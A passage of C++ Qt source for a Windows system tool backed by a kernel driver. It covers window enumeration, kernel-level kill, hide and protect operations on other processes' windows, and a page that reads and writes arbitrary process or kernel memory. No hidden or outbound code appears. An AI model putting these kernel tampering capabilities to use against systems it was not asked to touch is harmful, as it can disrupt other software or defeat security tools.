        auto *CopyAction = new QAction("Copy", Menu);
        auto *CopyPathAction = new QAction("Copy path", Menu);
        auto *RenameAction = new QAction("Rename", Menu);
        auto *ProtectAction = new QAction("Protect", Menu);
        auto *MonitorAction = new QAction("Monitor directory", Menu);
        const QStringList Paths = SelectedPaths();
        DeleteR0Action->setEnabled(std::all_of(Paths.begin(), Paths.end(),
                                               [](const QString &Path) { return QFileInfo(Path).isFile(); }));
        RenameAction->setEnabled(Paths.size() == 1);
        MonitorAction->setEnabled(Paths.size() == 1);
        Menu->addAction(DeleteAction);
        Menu->addAction(DeleteR0Action);
        Menu->addSeparator();
        Menu->addAction(CopyAction);
        Menu->addAction(CopyPathAction);
        Menu->addAction(RenameAction);
        Menu->addSeparator();
        Menu->addAction(ProtectAction);
        Menu->addAction(MonitorAction);
        ConnectMenuAction(DeleteAction, this, [this] { DeleteSelection(); });
        ConnectMenuAction(DeleteR0Action, this, [this] { DeleteSelectionR0(); });
        ConnectMenuAction(CopyAction, this, [this] { CopySelection(); });
        ConnectMenuAction(CopyPathAction, this, [this] { CopySelectionPath(); });
        ConnectMenuAction(RenameAction, this, [this] { RenameSelection(); });
        ConnectMenuAction(ProtectAction, this, [this] { ProtectSelection(); });
        ConnectMenuAction(MonitorAction, this, [this, Paths] {
            const QFileInfo Information(Paths.first());
            StartMonitoringDirectory(Information.isDir() ? Information.absoluteFilePath() : Information.absolutePath(),
                                     true, true);
        });
        ReleaseMenuAfterClose(Menu);
        Menu->exec(FileView->viewport()->mapToGlobal(Position));
    }

    TabBar *TabBarWidget = nullptr;
    QStackedWidget *Pages = nullptr;
    QFileSystemModel *DirectoryModel = nullptr;
    QFileSystemModel *FileModel = nullptr;
    QTreeView *DirectoryTree = nullptr;
    QTreeView *FileView = nullptr;
    ToolButton *BackButton = nullptr;
    ToolButton *ForwardButton = nullptr;
    ToolButton *UpButton = nullptr;
    ToolButton *RefreshButton = nullptr;
    LineEdit *AddressEdit = nullptr;
    SearchLineEdit *SearchEdit = nullptr;
    BodyLabel *StatusLabel = nullptr;
    TableWidget *ProtectedTable = nullptr;
    PushButton *UnprotectButton = nullptr;
    TableWidget *MonitorTable = nullptr;
    SearchLineEdit *MonitorSearchEdit = nullptr;
    BodyLabel *MonitorStatusLabel = nullptr;
    BodyLabel *MonitorDirectoryLabel = nullptr;
    PushButton *MonitorStopButton = nullptr;
    PushButton *MonitorClearButton = nullptr;
    QTimer *MonitorRefreshTimer = nullptr;
    std::unique_ptr<KernelMonitor> FileMonitor;
    std::mutex MonitorMutex;
    std::vector<FileMonitorEntry> MonitorEvents;
    std::atomic_uint64_t MonitorVersion = 0;
    uint64_t DisplayedMonitorVersion = 0;
    QString WatchedDisplayPath;
    QString WatchedNtPath;
    QString CurrentPath;
    QStringList History;
    QList<ProtectedFileEntry> ProtectedFiles;
    int HistoryIndex = -1;
};

QWidget *CreateFilePage()
{
    return new FileExplorerPage;
}

class WindowManagerPage final : public QWidget
{
    struct WindowRow
    {
        HWND Handle = nullptr;
        DWORD Pid = 0;
        DWORD Tid = 0;
        QString Title;
        QString ClassName;
        QString ProcessPath;
        RECT Rect{};
        RECT ClientRect{};
        LONG Style = 0;
        LONG ExStyle = 0;
        HWND ParentHwnd = nullptr;
        HWND OwnerHwnd = nullptr;
        UINT Dpi = 0;
        bool Visible = false;
        bool Enabled = false;
        bool Minimized = false;
        bool Maximized = false;
        bool IsHung = false;
        bool IsTopmost = false;
        bool IsLayered = false;
        bool IsToolWindow = false;
        bool IsPopup = false;
        bool IsChild = false;
        bool IsUnicode = false;
        bool IsAppWindow = false;
        UCHAR Alpha = 255;
    };

  public:
    explicit WindowManagerPage(QWidget *Parent = nullptr) : QWidget(Parent)
    {
        auto *Layout = new QVBoxLayout(this);
        ConfigurePageLayout(Layout);

        
        auto *Tabs = new TabBar;
        Tabs->setAddButtonVisible(false);
        Tabs->setTabsClosable(false);
        Tabs->setMovable(false);
        Tabs->addTab("windows", "Windows", Fluent::IconType::BACK_TO_WINDOW);
        Tabs->addTab("protected", "Protected", Fluent::IconType::CERTIFICATE);
        Layout->addWidget(Tabs);
        auto *Pages = new QStackedWidget;
        Layout->addWidget(Pages, 1);

        
        auto *WinPage = new QWidget;
        auto *WinLayout = new QVBoxLayout(WinPage);
        ConfigurePageLayout(WinLayout);
        auto *Toolbar = new QHBoxLayout;
        ConfigureToolbarLayout(Toolbar);
        SearchEdit = new SearchLineEdit;
        SearchEdit->setPlaceholderText("Search title, class, process, PID, or HWND");
        SearchEdit->setClearButtonEnabled(true);
        SearchEdit->setMaximumWidth(440);
        auto *RefreshButton = MakeButton("Refresh", true);
        Toolbar->addWidget(SearchEdit);
        Toolbar->addStretch();
        Toolbar->addWidget(RefreshButton);
        WinLayout->addLayout(Toolbar);
        WindowTable = MakeTable({"HWND", "Title", "Class", "Process", "PID", "Style", "State", "Rect", "Dpi"});
        WindowTable->setSelectionMode(QAbstractItemView::SingleSelection);
        WindowTable->setContextMenuPolicy(Qt::CustomContextMenu);
        WindowTable->setProperty("DetailDialogTitle", "Window details");
        WindowTable->horizontalHeader()->setStretchLastSection(false);
        for (int Column = 0; Column < WindowTable->columnCount(); ++Column)
            WindowTable->horizontalHeader()->setSectionResizeMode(Column, QHeaderView::ResizeToContents);
        WinLayout->addWidget(WindowTable, 1);

        
        auto *ProtPage = new QWidget;
        auto *ProtLayout = new QVBoxLayout(ProtPage);
        ConfigurePageLayout(ProtLayout, 10);
        auto *ProtToolbar = new QHBoxLayout;
        ConfigureToolbarLayout(ProtToolbar);
        auto *ProtTitle = MakeLabel("Protected Windows", 13, KTextPrimary, QFont::DemiBold);
        UnprotectButton = MakeButton("Unprotect", true);
        UnprotectButton->setEnabled(false);
        ProtToolbar->addWidget(ProtTitle);
        ProtToolbar->addStretch();
        ProtToolbar->addWidget(UnprotectButton);
        ProtLayout->addLayout(ProtToolbar);
        ProtectedTable = MakeTable({"HWND", "Title", "PID", "Flags"});
        ProtectedTable->setSelectionMode(QAbstractItemView::ExtendedSelection);
        ProtectedTable->setProperty("DetailDialogTitle", "Protected window details");
        ProtectedTable->horizontalHeader()->setSectionResizeMode(0, QHeaderView::ResizeToContents);
        ProtectedTable->horizontalHeader()->setSectionResizeMode(1, QHeaderView::Stretch);
        ProtLayout->addWidget(ProtectedTable, 1);

        Pages->addWidget(WinPage);
        Pages->addWidget(ProtPage);
        QObject::connect(Tabs, &TabBar::currentChanged, Pages, &QStackedWidget::setCurrentIndex);

        QObject::connect(SearchEdit, &QLineEdit::textChanged, this, [this] { Populate(); });
        QObject::connect(RefreshButton, &QPushButton::clicked, this, [this] { Refresh(); ShowSuccessNotice(this, "Window", "Window list refreshed."); });
        QObject::connect(WindowTable, &QWidget::customContextMenuRequested, this,
                         [this](const QPoint &Position) { ShowMenu(Position); });
        QObject::connect(UnprotectButton, &QPushButton::clicked, this, &WindowManagerPage::UnprotectSelected);
        QObject::connect(ProtectedTable, &QTableWidget::itemSelectionChanged, this, [this] {
            UnprotectButton->setEnabled(!ProtectedTable->selectionModel()->selectedRows(0).isEmpty());
        });
        Refresh();
    }

  private:
    static QString ReadWindowText(HWND Handle)
    {
        const int Length = GetWindowTextLengthW(Handle);
        if (Length <= 0) return {};
        std::wstring Text(static_cast<size_t>(Length) + 1, L'\0');
        GetWindowTextW(Handle, Text.data(), static_cast<int>(Text.size()));
        return QString::fromWCharArray(Text.c_str());
    }

    void Refresh()
    {
        Rows.clear();
        EnumWindows([](HWND Handle, LPARAM Parameter) -> BOOL {
            auto *Page = reinterpret_cast<WindowManagerPage *>(Parameter);
            WindowRow Row;
            Row.Handle = Handle;
            Row.Title = ReadWindowText(Handle);
            wchar_t ClassName[256]{};
            GetClassNameW(Handle, ClassName, 256);
            Row.ClassName = QString::fromWCharArray(ClassName);
            Row.Tid = GetWindowThreadProcessId(Handle, &Row.Pid);
            Row.Visible = IsWindowVisible(Handle) != FALSE;
            Row.Enabled = IsWindowEnabled(Handle) != FALSE;
            Row.Minimized = IsIconic(Handle) != FALSE;
            Row.Maximized = IsZoomed(Handle) != FALSE;
            Row.IsHung = IsHungAppWindow(Handle) != FALSE;
            Row.IsUnicode = IsWindowUnicode(Handle) != FALSE;
            Row.Style = GetWindowLongW(Handle, GWL_STYLE);
            Row.ExStyle = GetWindowLongW(Handle, GWL_EXSTYLE);
            Row.IsTopmost = (Row.ExStyle & WS_EX_TOPMOST) != 0;
            Row.IsLayered = (Row.ExStyle & WS_EX_LAYERED) != 0;
            Row.IsToolWindow = (Row.ExStyle & WS_EX_TOOLWINDOW) != 0;
            Row.IsAppWindow = (Row.ExStyle & WS_EX_APPWINDOW) != 0;
            Row.IsPopup = (Row.Style & WS_POPUP) != 0;
            Row.IsChild = (Row.Style & WS_CHILD) != 0;
            Row.ParentHwnd = GetParent(Handle);
            Row.OwnerHwnd = GetWindow(Handle, GW_OWNER);
            Row.Dpi = GetDpiForWindow(Handle);
            GetWindowRect(Handle, &Row.Rect);
            GetClientRect(Handle, &Row.ClientRect);
            HANDLE Process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, Row.Pid);
            if (Process)
            {
                wchar_t Path[32768]{};
                DWORD Size = 32768;
                if (QueryFullProcessImageNameW(Process, 0, Path, &Size))
                    Row.ProcessPath = QString::fromWCharArray(Path, static_cast<qsizetype>(Size));
                CloseHandle(Process);
            }
            if (!Row.Title.isEmpty() || !Row.ClassName.isEmpty()) Page->Rows.push_back(std::move(Row));
            return TRUE;
        }, reinterpret_cast<LPARAM>(this));
        std::sort(Rows.begin(), Rows.end(), [](const WindowRow &Left, const WindowRow &Right) {
            if (Left.Visible != Right.Visible) return Left.Visible > Right.Visible;
            return Left.Pid < Right.Pid;
        });
        Populate();
    }

    void Populate()
    {
        const QString Query = SearchEdit->text().trimmed();
        WindowTable->clearContents();
        WindowTable->setRowCount(0);
        for (const WindowRow &Window : Rows)
        {
            const QString HandleText = QString("0x%1").arg(reinterpret_cast<quintptr>(Window.Handle), 0, 16);
            const QString SearchText = Window.Title + " " + Window.ClassName + " " + Window.ProcessPath +
                                       " " + QString::number(Window.Pid) + " " + HandleText;
            if (!Query.isEmpty() && !SearchText.contains(Query, Qt::CaseInsensitive)) continue;
            QStringList States{Window.Visible ? "Visible" : "Hidden", Window.Enabled ? "Enabled" : "Disabled"};
            if (Window.Minimized) States.append("Minimized");
            if (Window.Maximized) States.append("Maximized");
            if (Window.IsHung) States.append("HUNG");
            if (Window.IsTopmost) States.append("Topmost");
            const int Row = WindowTable->rowCount();
            WindowTable->insertRow(Row);
            auto *HandleItem = new QTableWidgetItem(HandleText);
            HandleItem->setData(Qt::UserRole, QVariant::fromValue<qulonglong>(reinterpret_cast<quintptr>(Window.Handle)));
            WindowTable->setItem(Row, 0, HandleItem);
            WindowTable->setItem(Row, 1, new QTableWidgetItem(Window.Title.isEmpty() ? "(untitled)" : Window.Title));
            WindowTable->setItem(Row, 2, new QTableWidgetItem(Window.ClassName));
            WindowTable->setItem(Row, 3, new QTableWidgetItem(Window.ProcessPath));
            WindowTable->setItem(Row, 4, new QTableWidgetItem(QString::number(Window.Pid)));
            WindowTable->setItem(Row, 5, new QTableWidgetItem(QString("0x%1 | Ex:0x%2")
                .arg(Window.Style, 8, 16, QChar('0')).arg(Window.ExStyle, 8, 16, QChar('0'))));
            WindowTable->setItem(Row, 6, new QTableWidgetItem(States.join(" | ")));
            WindowTable->setItem(Row, 7, new QTableWidgetItem(QString("(%1,%2)-(%3,%4) %5x%6")
                .arg(Window.Rect.left).arg(Window.Rect.top).arg(Window.Rect.right).arg(Window.Rect.bottom)
                .arg(Window.Rect.right - Window.Rect.left).arg(Window.Rect.bottom - Window.Rect.top)));
            WindowTable->setItem(Row, 8, new QTableWidgetItem(QString::number(Window.Dpi)));
            WindowTable->setRowHeight(Row, 38);
        }
    }

    void ShowMenu(const QPoint &Position)
    {
        const QModelIndex Index = WindowTable->indexAt(Position);
        if (!Index.isValid()) return;
        WindowTable->selectRow(Index.row());
        const HWND Handle = reinterpret_cast<HWND>(static_cast<quintptr>(
            WindowTable->item(Index.row(), 0)->data(Qt::UserRole).toULongLong()));
        if (!IsWindow(Handle)) return;
        DWORD TargetPid = 0;
        GetWindowThreadProcessId(Handle, &TargetPid);
        const bool IsOwnWindow = TargetPid == GetCurrentProcessId();
        const bool IsProtected = IsTrackedProtectedWindow((ULONG64)(ULONG_PTR)Handle);
        auto *Menu = new RoundMenu(QString(), this);
        const auto AddAction = [this, Menu, Handle, IsProtected](const QString &Text, const std::function<bool(HWND)> &Action) {
            auto *Item = new QAction(Text, Menu);
            Menu->addAction(Item);
            ConnectMenuAction(Item, this, [this, Handle, Text, Action] {
                if (IsTrackedProtectedWindow((ULONG64)(ULONG_PTR)Handle))
                {
                    ShowWarningNotice(this, "Window", "This window is protected. Unprotect it first.");
                    return;
                }
                if (Action(Handle)) ShowSuccessNotice(this, "Window", Text + " completed.");
                else ShowErrorNotice(this, "Window", Text + " failed.");
                QTimer::singleShot(150, this, [this] { Refresh(); });
            });
            if (IsProtected && Text != "Ping") Item->setEnabled(false);
        };
        AddAction("Show / Activate", [](HWND H) { ShowWindow(H, SW_SHOW); return SetForegroundWindow(H) != FALSE; });
        if (!IsOwnWindow) AddAction("Hide", [](HWND H) { ShowWindow(H, SW_HIDE); return IsWindow(H) != FALSE; });
        AddAction("Minimize", [](HWND H) { ShowWindow(H, SW_MINIMIZE); return IsWindow(H) != FALSE; });
        AddAction("Maximize", [](HWND H) { ShowWindow(H, SW_MAXIMIZE); return IsWindow(H) != FALSE; });
        AddAction("Restore", [](HWND H) { ShowWindow(H, SW_RESTORE); SetForegroundWindow(H); return IsWindow(H) != FALSE; });
        Menu->addSeparator();
        AddAction("Enable", [](HWND H) { return EnableWindow(H, TRUE) != FALSE || GetLastError() == ERROR_SUCCESS; });
        if (!IsOwnWindow) AddAction("Disable", [](HWND H) { return EnableWindow(H, FALSE) != FALSE || GetLastError() == ERROR_SUCCESS; });
        AddAction("Topmost", [](HWND H) { return SetWindowPos(H, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE) != FALSE; });
        AddAction("Remove topmost", [](HWND H) { return SetWindowPos(H, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE) != FALSE; });
        AddAction("Ping", [this](HWND H) {
            DWORD_PTR Result = 0;
            return SendMessageTimeoutW(H, WM_NULL, 0, 0, SMTO_ABORTIFHUNG, 1000, &Result) != 0;
        });
        Menu->addSeparator();
        if (!IsOwnWindow)
        {
            AddAction("Post WM_CLOSE", [](HWND H) { return PostMessageW(H, WM_CLOSE, 0, 0) != FALSE; });
            AddAction("Send SC_CLOSE", [](HWND H) { DWORD_PTR Result = 0; return SendMessageTimeoutW(H, WM_SYSCOMMAND, SC_CLOSE, 0, SMTO_ABORTIFHUNG, 1000, &Result) != 0; });
        }

        if (!IsOwnWindow && G_DeviceHandle != INVALID_HANDLE_VALUE)
        {
            Menu->addSeparator();
            auto *KernelMenu = new RoundMenu("Kernel Operations", Menu);

            auto AddKernelAction = [this, Menu, KernelMenu, Handle, TargetPid](
                const QString &Text,
                const std::function<BOOL()> &KernelOp,
                const std::function<BOOL(HWND)> &UserOp)
            {
                auto *Item = new QAction(Text, KernelMenu);
                KernelMenu->addAction(Item);
                ConnectMenuAction(Item, this, [this, Text, Handle, KernelOp, UserOp] {
                    BOOL Result = FALSE;
                    if (G_DeviceHandle != INVALID_HANDLE_VALUE)
                        Result = KernelOp();
                    else if (UserOp)
                        Result = UserOp(Handle);
                    if (Result) ShowSuccessNotice(this, "Window", Text + " completed.");
                    else ShowErrorNotice(this, "Window", Text + " failed.");
                    QTimer::singleShot(150, this, [this] { Refresh(); });
                });
            };

            AddKernelAction("Kill Window (Kernel)", [TargetPid, Handle]() -> BOOL {
                return WindowKill(TargetPid, (ULONG64)(ULONG_PTR)Handle);
            }, [](HWND H) -> BOOL {
                return PostMessageW(H, WM_CLOSE, 0, 0);
            });

            AddKernelAction("Force Hide", [TargetPid, Handle]() -> BOOL {
                return WindowHide(TargetPid, (ULONG64)(ULONG_PTR)Handle);
            }, [](HWND H) -> BOOL {
                return ShowWindow(H, SW_HIDE) != FALSE || TRUE;
            });

            AddKernelAction("Force Show", [TargetPid, Handle]() -> BOOL {
                return WindowShow(TargetPid, (ULONG64)(ULONG_PTR)Handle);
            }, [](HWND H) -> BOOL {
                return ShowWindow(H, SW_SHOW) != FALSE || TRUE;
            });

            AddKernelAction("Force Disable", [TargetPid, Handle]() -> BOOL {
                return WindowDisable(TargetPid, (ULONG64)(ULONG_PTR)Handle);
            }, [](HWND H) -> BOOL {
                return EnableWindow(H, FALSE);
            });

            AddKernelAction("Force Enable", [TargetPid, Handle]() -> BOOL {
                return WindowEnable(TargetPid, (ULONG64)(ULONG_PTR)Handle);
            }, [](HWND H) -> BOOL {
                return EnableWindow(H, TRUE);
            });

            AddKernelAction("Force Topmost", [TargetPid, Handle]() -> BOOL {
                return WindowSetTopmost(TargetPid, (ULONG64)(ULONG_PTR)Handle);
            }, [](HWND H) -> BOOL {
                return SetWindowPos(H, HWND_TOPMOST, 0, 0, 0, 0,
                    SWP_NOMOVE | SWP_NOSIZE);
            });

            AddKernelAction("Force Remove Topmost", [TargetPid, Handle]() -> BOOL {
                return WindowRemoveTopmost(TargetPid, (ULONG64)(ULONG_PTR)Handle);
            }, [](HWND H) -> BOOL {
                return SetWindowPos(H, HWND_NOTOPMOST, 0, 0, 0, 0,
                    SWP_NOMOVE | SWP_NOSIZE);
            });

            AddKernelAction("Set Title...", [TargetPid, Handle, this]() -> BOOL {
                bool Ok = false;
                QString NewTitle = QInputDialog::getText(WindowTable, "Set Window Title",
                    "New title:", QLineEdit::Normal, QString(), &Ok);
                if (!Ok || NewTitle.isEmpty()) return TRUE;
                std::wstring WideTitle(reinterpret_cast<const wchar_t*>(NewTitle.utf16()));
                return WindowSetTitle(TargetPid, (ULONG64)(ULONG_PTR)Handle,
                    WideTitle.c_str());
            }, [this](HWND H) -> BOOL {
                bool Ok = false;
                QString NewTitle = QInputDialog::getText(WindowTable, "Set Window Title (User)",
                    "New title:", QLineEdit::Normal, QString(), &Ok);
                if (!Ok || NewTitle.isEmpty()) return TRUE;
                std::wstring WideTitle(reinterpret_cast<const wchar_t*>(NewTitle.utf16()));
                return SetWindowTextW(H, WideTitle.c_str());
            });

            KernelMenu->addSeparator();
            AddKernelAction("Kill (Direct)", [TargetPid, Handle]() -> BOOL {
                return WindowKill(TargetPid, (ULONG64)(ULONG_PTR)Handle, WINDOW_FLAG_DIRECT);
            }, [](HWND H) -> BOOL {
                return PostMessageW(H, WM_CLOSE, 0, 0);
            });
            AddKernelAction("Hide (Direct)", [TargetPid, Handle]() -> BOOL {
                return WindowHide(TargetPid, (ULONG64)(ULONG_PTR)Handle, WINDOW_FLAG_DIRECT);
            }, [](HWND H) -> BOOL {
                return ShowWindow(H, SW_HIDE) != FALSE || TRUE;
            });
            Menu->addMenu(KernelMenu);
        }
        else if (!IsOwnWindow)
        {
            Menu->addSeparator();
            const auto AddActionWithCheck = [this, Menu](const QString &Text, const std::function<bool()> &Action) {
                auto *Item = new QAction(Text, Menu);
                Menu->addAction(Item);
                ConnectMenuAction(Item, this, [this, Text, Action] {
                    const QModelIndex Current = WindowTable->currentIndex();
                    if (Current.isValid())
                    {
                        const auto Hwnd = WindowTable->item(Current.row(), 0)->data(Qt::UserRole).toULongLong();
                        if (IsTrackedProtectedWindow(Hwnd))
                        {
                            ShowWarningNotice(this, "Window", "This window is protected. Unprotect it first.");
                            return;
                        }
                    }
                    if (Action()) ShowSuccessNotice(this, "Window", Text + " completed.");
                    else ShowErrorNotice(this, "Window", Text + " failed.");
                    QTimer::singleShot(150, this, [this] { Refresh(); });
                });
            };
            AddActionWithCheck("Change Title...", [this, Handle]() -> bool {
                bool Ok = false;
                QString NewTitle = QInputDialog::getText(WindowTable, "Set Window Title",
                    "New title:", QLineEdit::Normal, QString(), &Ok);
                if (!Ok || NewTitle.isEmpty()) return true;
                std::wstring WideTitle(reinterpret_cast<const wchar_t*>(NewTitle.utf16()));
                return SetWindowTextW(Handle, WideTitle.c_str()) != FALSE;
            });
        }

        
        if (!IsOwnWindow && TargetPid != 0)
        {
            Menu->addSeparator();
            auto *ProtectAction = new QAction("Protect Window", Menu);
            Menu->addAction(ProtectAction);
            ConnectMenuAction(ProtectAction, this, [this, Handle, TargetPid] {
                QString Title = ReadWindowText(Handle);
                ProtectWindowEntry(TargetPid, (ULONG64)(ULONG_PTR)Handle, Title.isEmpty() ? "(untitled)" : Title);
            });
        }

        ReleaseMenuAfterClose(Menu);
        Menu->exec(WindowTable->viewport()->mapToGlobal(Position));
    }

    SearchLineEdit *SearchEdit = nullptr;
    TableWidget *WindowTable = nullptr;
    TableWidget *ProtectedTable = nullptr;
    PushButton *UnprotectButton = nullptr;
    std::vector<WindowRow> Rows;

    struct ProtectedWin { ULONG64 Hwnd; ULONG Pid; QString Title; ULONG Flags; };
    std::vector<ProtectedWin> ProtectedWindows;

    bool IsTrackedProtectedWindow(ULONG64 Hwnd) const
    {
        return std::any_of(ProtectedWindows.begin(), ProtectedWindows.end(),
            [Hwnd](const ProtectedWin &Entry) { return Entry.Hwnd == Hwnd; });
    }

    void ProtectWindowEntry(ULONG Pid, ULONG64 Hwnd, const QString &Title)
    {
        if (IsTrackedProtectedWindow(Hwnd))
        {
            ShowWarningNotice(this, "Window", "This window is already protected.");
            return;
        }
        if (G_DeviceHandle == INVALID_HANDLE_VALUE)
        {
            ShowErrorNotice(this, "Window", "Kernel driver is not available.");
            return;
        }
        if (!ProtectWindowKernel(Pid, Hwnd, WINPROT_ALL))
        {
            ShowErrorNotice(this, "Window",
                QString("Protect failed. Error: %1").arg(G_LastMultiDrvError));
            return;
        }
        ProtectedWindows.push_back({Hwnd, Pid, Title, WINPROT_ALL});
        RefreshProtectedTable();
        ShowSuccessNotice(this, "Window", "Window protected.");
    }

    void UnprotectSelected()
    {
        std::vector<ProtectedWin> ToRemove;
        QStringList Failures;
        for (const QModelIndex &Idx : ProtectedTable->selectionModel()->selectedRows(0))
        {
            ULONG64 Hwnd = Idx.data(Qt::UserRole).toULongLong();
            ULONG Pid = Idx.data(Qt::UserRole + 1).toUInt();
            for (const auto &P : ProtectedWindows)
                if (P.Hwnd == Hwnd) { ToRemove.push_back(P); break; }
            if (G_DeviceHandle == INVALID_HANDLE_VALUE || !UnprotectWindowKernel(Pid, Hwnd))
                Failures.append(QString("0x%1").arg(Hwnd, 0, 16));
        }
        for (const auto &P : ToRemove)
        {
            if (Failures.contains(QString("0x%1").arg(P.Hwnd, 0, 16), Qt::CaseInsensitive))
                continue;
            auto It = std::find_if(ProtectedWindows.begin(), ProtectedWindows.end(),
                [&P](const ProtectedWin &W) { return W.Hwnd == P.Hwnd; });
            if (It != ProtectedWindows.end()) ProtectedWindows.erase(It);
        }
        RefreshProtectedTable();
        if (Failures.isEmpty())
            ShowSuccessNotice(this, "Window", "Selected window protection removed.");
        else
            ShowErrorNotice(this, "Window", "Failed to unprotect:\n" + Failures.join('\n'));
    }

    void RefreshProtectedTable()
    {
        ProtectedTable->clearContents();
        ProtectedTable->setRowCount(static_cast<int>(ProtectedWindows.size()));
        for (int R = 0; R < static_cast<int>(ProtectedWindows.size()); ++R)
        {
            const auto &P = ProtectedWindows[R];
            auto *HwndItem = new QTableWidgetItem(QString("0x%1").arg(P.Hwnd, 0, 16));
            HwndItem->setData(Qt::UserRole, QVariant::fromValue<qulonglong>(P.Hwnd));
            HwndItem->setData(Qt::UserRole + 1, QVariant::fromValue<quint32>(P.Pid));
            ProtectedTable->setItem(R, 0, HwndItem);
            ProtectedTable->setItem(R, 1, new QTableWidgetItem(P.Title));
            ProtectedTable->setItem(R, 2, new QTableWidgetItem(QString::number(P.Pid)));
            ProtectedTable->setItem(R, 3, new QTableWidgetItem(QString("0x%1").arg(P.Flags, 8, 16, QLatin1Char('0'))));
            ProtectedTable->setRowHeight(R, 38);
        }
        UnprotectButton->setEnabled(false);
    }
};

QWidget *CreateWindowPage() { return new WindowManagerPage; }

QWidget *CreateMemoryPage()
{
    auto *Page = new QWidget;
    auto *Layout = new QVBoxLayout(Page);
    ConfigurePageLayout(Layout);
    auto *Hint = MakeLabel("Process ID accepts 0. `0` means kernel mode memory access.", 11, KTextMuted);
    Hint->setWordWrap(true);
    Layout->addWidget(Hint);
    auto *TargetLayout = new QHBoxLayout;
    ConfigureToolbarLayout(TargetLayout);
    auto *Pid = new LineEdit;
    auto *Address = new LineEdit;
    Pid->setPlaceholderText("Process ID (0 = kernel mode)");
    Address->setPlaceholderText("Address, for example 0x7FF612340000");
    Pid->setMaximumWidth(190); TargetLayout->addWidget(Pid); TargetLayout->addWidget(Address, 1); Layout->addLayout(TargetLayout);
    auto *ReadLayout = new QHBoxLayout; ConfigureToolbarLayout(ReadLayout); auto *ReadSize = new LineEdit; ReadSize->setText("256"); ReadSize->setPlaceholderText("Read size (1-4096)");
    auto *ReadButton = MakeButton("Read", true); ReadLayout->addWidget(ReadSize, 1); ReadLayout->addWidget(ReadButton); Layout->addLayout(ReadLayout);
    auto *ViewerLayout = new QHBoxLayout;
    ConfigureToolbarLayout(ViewerLayout);
    auto *HexPanel = new QVBoxLayout;
    auto *AsciiPanel = new QVBoxLayout;
    HexPanel->setContentsMargins(0, 0, 0, 0);
    HexPanel->setSpacing(6);
    AsciiPanel->setContentsMargins(0, 0, 0, 0);
    AsciiPanel->setSpacing(6);
    auto *HexLabel = MakeLabel("HEX", 11, KTextMuted);
    auto *AsciiLabel = MakeLabel("ASCII", 11, KTextMuted);
    auto *HexView = new PlainTextEdit;
    auto *AsciiView = new PlainTextEdit;
    HexView->setPlaceholderText("Hex bytes for read/write, for example: 48 8B 05 00 FF");
    AsciiView->setPlaceholderText("ASCII view of the latest read result");
    HexView->setFont(QFont("Cascadia Mono", 10));
    AsciiView->setFont(QFont("Cascadia Mono", 10));
    AsciiView->setReadOnly(true);
    InstallFluentScrollBar(HexView, Qt::Vertical);
    InstallFluentScrollBar(AsciiView, Qt::Vertical);
    HexPanel->addWidget(HexLabel);
    HexPanel->addWidget(HexView, 1);
    AsciiPanel->addWidget(AsciiLabel);
    AsciiPanel->addWidget(AsciiView, 1);
    ViewerLayout->addLayout(HexPanel, 3);
    ViewerLayout->addLayout(AsciiPanel, 2);
    Layout->addLayout(ViewerLayout, 1);
    auto *WriteLayout = new QHBoxLayout; ConfigureToolbarLayout(WriteLayout); auto *Status = new BodyLabel("Ready"); auto *WriteButton = MakeButton("Write"); WriteLayout->addWidget(Status, 1); WriteLayout->addWidget(WriteButton); Layout->addLayout(WriteLayout);
    const auto ParseTarget = [Page, Pid, Address](ULONG &ProcessId, ULONG_PTR &TargetAddress) {
        bool PidOk = false, AddressOk = false; const qulonglong PidValue = Pid->text().trimmed().toULongLong(&PidOk, 0); const qulonglong AddressValue = Address->text().trimmed().toULongLong(&AddressOk, 0);
        if (!PidOk || PidValue > std::numeric_limits<ULONG>::max() || !AddressOk || AddressValue == 0) { ShowWarningNotice(Page, "Memory", "Enter a valid PID and address. PID 0 means kernel mode."); return false; }
        ProcessId = static_cast<ULONG>(PidValue); TargetAddress = static_cast<ULONG_PTR>(AddressValue); return true;
    };
    QObject::connect(ReadButton, &QPushButton::clicked, Page, [Page, ReadSize, HexView, AsciiView, Status, ParseTarget] {
        ULONG ProcessId = 0; ULONG_PTR TargetAddress = 0; if (!ParseTarget(ProcessId, TargetAddress)) return; bool SizeOk = false; const uint Size = ReadSize->text().trimmed().toUInt(&SizeOk, 0);
        if (!SizeOk || Size == 0 || Size > 4096) { ShowWarningNotice(Page, "Memory", "Read size must be between 1 and 4096."); return; }
        std::vector<unsigned char> Buffer(Size); ULONG BytesRead = 0; if (!ReadMemory(ProcessId, TargetAddress, Buffer.data(), Size, &BytesRead)) { const QString Message = QString("Read failed (error %1)").arg(G_LastMultiDrvError); Status->setText(Message); ShowErrorNotice(Page, "Memory", Message); return; }
        Buffer.resize(std::min<size_t>(BytesRead, Buffer.size())); QString HexOutput; QString AsciiOutput;
        for (size_t Offset = 0; Offset < Buffer.size(); Offset += 16)
        {
            QString HexLine = QString("%1  ").arg(TargetAddress + Offset, sizeof(ULONG_PTR) * 2, 16, QLatin1Char('0')).toUpper();
            QString AsciiLine = QString("%1  ").arg(TargetAddress + Offset, sizeof(ULONG_PTR) * 2, 16, QLatin1Char('0')).toUpper();
            for (size_t Index = 0; Index < 16; ++Index)
            {
                if (Offset + Index < Buffer.size())
                {
                    const unsigned char Value = Buffer[Offset + Index];
                    HexLine += QString("%1 ").arg(Value, 2, 16, QLatin1Char('0')).toUpper();
                    AsciiLine += std::isprint(static_cast<int>(Value)) ? QChar(Value) : QChar('.');
                }
                else
                {
                    HexLine += "   ";
                }
                if (Index == 7) HexLine += ' ';
            }
            HexOutput += HexLine.trimmed() + '\n';
            AsciiOutput += AsciiLine + '\n';
        }
        HexView->setPlainText(HexOutput.trimmed());
        AsciiView->setPlainText(AsciiOutput.trimmed());
        const QString Message = QString("Read %1 byte(s).").arg(Buffer.size()); Status->setText(Message); ShowSuccessNotice(Page, "Memory", Message);
    });
    QObject::connect(WriteButton, &QPushButton::clicked, Page, [Page, HexView, Status, ParseTarget] {
        ULONG ProcessId = 0; ULONG_PTR TargetAddress = 0; if (!ParseTarget(ProcessId, TargetAddress)) return; QString Text = HexView->toPlainText();
        Text.replace(',', ' ').replace(';', ' ').replace('\n', ' ').replace('\t', ' ').replace('\r', ' ');
        QRegularExpression AddressPrefix("(?i)\\b[0-9a-f]+\\s{2,}");
        Text.replace(AddressPrefix, "");
